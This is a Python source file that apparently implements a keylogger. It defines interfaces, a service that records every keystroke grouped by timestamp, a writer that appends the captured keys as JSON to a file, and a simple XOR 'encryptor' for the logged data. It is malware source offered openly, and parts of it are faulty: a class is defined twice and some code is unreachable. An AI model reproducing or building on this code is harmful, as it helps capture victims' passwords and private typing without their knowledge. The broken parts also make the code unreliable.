from abc import ABC, abstractmethod
from typing import List
import time
import json,random
import string

import ToolBox


class Write(ABC):
    @abstractmethod
    def write(self):
        pass

class IKeyLogger(ABC):
    @abstractmethod
    def on_press(self,key) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass
class IKeyLoggerManager(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass
    @abstractmethod
    def stop_logging(self) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass

class Write(ABC):
    @abstractmethod
    def write(self, data:str) -> bool:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.__logged_keys = {}
        self.__last_key = ""
        self.__last_type_time = None

    def on_press(self, key) -> None:
        key = ToolBox.format_key(key)
        current_time = time.time()
        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))

        if self.__last_type_time is None or current_time - self.__last_type_time >= 15:
            self.__last_key = current_time_formatted

        self.__last_type_time = current_time

        if self.__last_key not in self.__logged_keys:
            self.__logged_keys[self.__last_key] = ""

        self.__logged_keys[self.__last_key] += key


    def stop_logging(self) -> None:
        self.last_key = ""
        self.last_type_time = None

    def get_logged_keys(self) -> dict[str:str]:
        return self.__logged_keys


        return self.logged_keys



class FileWriter(Write):
    def __init__(self,path=None):
        self.path = path or r""

    def write(self, data:dict[str:str]) -> bool:
        try:
            with open(self.path,"a") as file:
                convert_data = json.dumps(data)
                file.write(convert_data)
                return True
        except IOError:
            return False


class Encryptor:
    def __init__(self):
        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))

    def encrypt(self,data:str) -> str:
        ciphertext = ""
        length_key = len(self.key)
        for i in range(len(data)):
            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
        return ciphertext








